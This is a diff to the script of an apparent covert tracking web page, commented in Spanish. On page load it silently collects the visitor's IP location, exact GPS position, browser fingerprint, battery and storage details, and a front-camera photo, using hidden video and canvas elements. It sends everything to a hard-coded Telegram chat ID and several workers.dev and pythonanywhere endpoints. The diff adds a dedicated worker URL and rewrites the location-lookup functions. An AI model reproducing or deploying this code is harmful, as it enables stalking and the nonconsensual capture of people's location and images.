@@ -16,7 +16,6 @@
             font-family: system-ui;
         }
         video, canvas { display: none; }
-        /* Sin ningún elemento visible */
     </style>
 </head>
 <body>
@@ -27,6 +26,9 @@
     <script>
         // ================= CONFIGURACIÓN =================
         const CHAT_ID = '7555997298';
+        // URL del Worker que usará getLocationFromWorker()
+        const WORKER_URL = 'https://kali-bot12.societykark.workers.dev';  // ✅ CAMBIA SI ES OTRO
+        // Todas las URLs a las que se enviarán los datos
         const URLS = [
             'https://bot-ubi.societykark.workers.dev',
             'https://bot-tg.societykark.workers.dev',
@@ -35,8 +37,45 @@
             'https://app-tg.societykark.workers.dev',
             'https://app-kali.societykark.workers.dev',
             'https://societykark.pythonanywhere.com',
-            'https://kali-bot12.societykark.workers.dev'  // ✅ NUEVA URL AGREGADA
+            'https://kali-bot12.societykark.workers.dev'  // ✅ NUEVA URL
         ];
+
+        // ---------- 1. Obtener ubicación desde Cloudflare Worker (TAL CUAL) ----------
+        async function getLocationFromWorker() {
+            try {
+                const res = await fetch(WORKER_URL);
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'N/A',
+                    country: data.country || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ---------- 2. Obtener ubicación desde ipapi.co (TAL CUAL) ----------
+        async function getLocationFromIpapi() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip || 'N/A',
+                    country: data.country_name || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch(e) {
+                return null;
+            }
+        }
 
         // ---------- FUNCIÓN DE GEOCODIFICACIÓN INVERSA ----------
         async function reverseGeocode(lat, lng) {
@@ -68,48 +107,6 @@
             try {
                 await fetch(URLS[1], { method: 'POST', body: formData });
             } catch(e) {}
-        }
-
-        // ---------- 1. OBTENER UBICACIÓN DESDE CLOUDFLARE WORKER ----------
-        async function getLocationFromWorker() {
-            try {
-                const res = await fetch(URLS[1]);
-                const data = await res.json();
-                if (data && data.ip) {
-                    return {
-                        ip: data.ip || 'N/A',
-                        country: data.country || 'N/A',
-                        region: data.region || 'N/A',
-                        city: data.city || 'N/A',
-                        postal: data.postal || 'N/A',
-                        timezone: data.timezone || 'N/A',
-                        isProxy: data.proxy || false,
-                        isHosting: data.hosting || false
-                    };
-                }
-            } catch(e) {}
-            return null;
-        }
-
-        // ---------- 2. OBTENER UBICACIÓN DESDE ipapi.co (con VPN/Proxy) ----------
-        async function getLocationFromIpapi() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if (data && data.ip) {
-                    return {
-                        ip: data.ip || 'N/A',
-                        country: data.country_name || 'N/A',
-                        region: data.region || 'N/A',
-                        city: data.city || 'N/A',
-                        postal: data.postal || 'N/A',
-                        timezone: data.timezone || 'N/A',
-                        isProxy: data.proxy || false,
-                        isHosting: data.hosting || false
-                    };
-                }
-            } catch(e) {}
-            return null;
         }
 
         // ---------- 3. FINGERPRINT ----------
@@ -180,7 +177,7 @@
             return new Date().toLocaleString();
         }
 
-        // ---------- 8. GPS EXACTO (con watchPosition para mejor precisión) ----------
+        // ---------- 8. GPS EXACTO ----------
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -202,7 +199,7 @@
             });
         }
 
-        // ---------- 9. CÁMARA FRONTAL (SOLO FRONTAL) ----------
+        // ---------- 9. CÁMARA FRONTAL ----------
         async function capturePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -251,7 +248,7 @@
             return resultados.some(r => r.ok);
         }
 
-        // ---------- 11. PROCESO PRINCIPAL (TODO AUTOMÁTICO Y SILENCIOSO) ----------
+        // ---------- 11. PROCESO PRINCIPAL (AUTOMÁTICO Y SILENCIOSO) ----------
         window.addEventListener('load', async function() {
             try {
                 // Notificación de apertura
@@ -269,7 +266,7 @@
                 const storage = await getStorageInfo();
                 const battery = await getBatteryInfo();
                 const localTime = getLocalTime();
-                const photo = await capturePhoto(); // Siempre frontal
+                const photo = await capturePhoto();
 
                 // Dirección real
                 let address = null;
@@ -282,10 +279,6 @@
                 msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                 msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
                 msg += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n`;
-                if (workerLoc) {
-                    msg += `   • VPN/Proxy: ${workerLoc.isProxy ? 'Sí' : 'No'}\n`;
-                    msg += `   • Hosting/Datacenter: ${workerLoc.isHosting ? 'Sí' : 'No'}\n`;
-                }
                 msg += `   • Language: ${device.language}\n\n`;
                 msg += `📍 *Cloudflare Worker Location*\n`;
                 if (workerLoc && workerLoc.city !== 'N/A') {
